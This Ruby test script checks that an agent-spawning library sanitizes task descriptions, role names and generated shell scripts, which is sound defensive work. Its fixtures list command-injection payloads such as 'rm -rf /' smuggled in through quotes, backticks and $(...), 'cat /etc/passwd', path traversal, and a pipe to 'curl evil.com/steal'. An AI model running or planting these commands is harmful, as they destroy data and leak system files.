#!/usr/bin/env ruby
# Security test for agent spawning

$LOAD_PATH.unshift File.expand_path('lib', __dir__)
require 'enhance_swarm'

def test_security_vulnerabilities
  puts "🔒 Security Vulnerability Tests"
  puts "=" * 40

  results = []

  # Test 1: Command injection in task description
  puts "\n1️⃣  Testing Command Injection in Task Description..."
  
  malicious_tasks = [
    'test"; rm -rf /; echo "pwned',
    'test`rm -rf /`test',
    'test$(rm -rf /)test',
    'test; cat /etc/passwd',
    'test && echo "hack" > /tmp/hacked',
    'test | curl evil.com/steal'
  ]

  spawner = EnhanceSwarm::AgentSpawner.new
  
  malicious_tasks.each_with_index do |task, i|
    puts "   Testing: #{task[0..30]}..."
    
    begin
      # Test sanitization
      safe_task = spawner.send(:sanitize_task_description, task)
      
      # Check if dangerous characters were removed
      dangerous_chars = ['`', '$', ';', '&', '|']
      has_dangerous = dangerous_chars.any? { |char| safe_task.include?(char) }
      
      if has_dangerous
        puts "   ❌ FAIL: Dangerous characters not removed from: #{safe_task}"
        results << { test: "Command injection #{i+1}", status: "❌ FAIL" }
      else
        puts "   ✅ PASS: Task sanitized to: #{safe_task}"
        results << { test: "Command injection #{i+1}", status: "✅ PASS" }
      end
      
    rescue => e
      puts "   ❌ ERROR: #{e.message}"
      results << { test: "Command injection #{i+1}", status: "❌ ERROR" }
    end
  end

  # Test 2: Role validation
  puts "\n2️⃣  Testing Role Validation..."
  
  malicious_roles = [
    '../../../etc/passwd',
    'admin; rm -rf /',
    '`cat /etc/passwd`',
    'unknown_role',
    nil,
    ''
  ]

  malicious_roles.each_with_index do |role, i|
    puts "   Testing role: #{role.inspect}"
    
    begin
      safe_role = spawner.send(:sanitize_role, role)
      
      # Should only allow known safe roles
      safe_roles = %w[ux backend frontend qa general]
      
      if safe_roles.include?(safe_role)
        puts "   ✅ PASS: Role sanitized to: #{safe_role}"
        results << { test: "Role validation #{i+1}", status: "✅ PASS" }
      else
        puts "   ❌ FAIL: Unsafe role allowed: #{safe_role}"
        results << { test: "Role validation #{i+1}", status: "❌ FAIL" }
      end
      
    rescue => e
      puts "   ❌ ERROR: #{e.message}"
      results << { test: "Role validation #{i+1}", status: "❌ ERROR" }
    end
  end

  # Test 3: Script generation safety
  puts "\n3️⃣  Testing Script Generation Safety..."
  
  begin
    # Test with potentially dangerous prompt
    dangerous_prompt = 'test"; echo "hacked" > /tmp/pwned; echo "'
    script_path = spawner.send(:create_agent_script, dangerous_prompt, 'backend', '/tmp')
    
    if File.exist?(script_path)
      script_content = File.read(script_path)
      
      # Check if the dangerous content is properly quoted in heredoc
      if script_content.include?("'EOF'") && script_content.include?('cat > "$PROMPT_FILE" << \'EOF\'')
        puts "   ✅ PASS: Script uses safe heredoc with single quotes"
        results << { test: "Script generation safety", status: "✅ PASS" }
      else
        puts "   ❌ FAIL: Script may be vulnerable to injection"
        puts "   Script preview: #{script_content[0..200]}..."
        results << { test: "Script generation safety", status: "❌ FAIL" }
      end
      
      # Cleanup
      File.delete(script_path) if File.exist?(script_path)
    else
      puts "   ❌ ERROR: Failed to create script"
      results << { test: "Script generation safety", status: "❌ ERROR" }
    end
    
  rescue => e
    puts "   ❌ ERROR: #{e.message}"
    results << { test: "Script generation safety", status: "❌ ERROR" }
  end

  # Results summary
  puts "\n" + "=" * 40
  puts "🔒 SECURITY TEST RESULTS"
  puts "=" * 40

  passed = results.count { |r| r[:status].include?("✅") }
  total = results.length
  
  results.each do |result|
    puts "   #{result[:status]} #{result[:test]}"
  end

  puts "\n📊 Security Test Success Rate: #{passed}/#{total} (#{total > 0 ? (passed.to_f / total * 100).round(1) : 0}%)"
  
  if passed == total && total > 0
    puts "\n🛡️  ALL SECURITY TESTS PASSED!"
    puts "   ✅ Command injection protection working"
    puts "   ✅ Role validation working"  
    puts "   ✅ Script generation is safe"
  else
    puts "\n⚠️  SECURITY ISSUES DETECTED!"
    puts "   Review failed tests and address vulnerabilities"
  end
  
  passed == total && total > 0
end

if __FILE__ == $0
  success = test_security_vulnerabilities
  exit(success ? 0 : 1)
end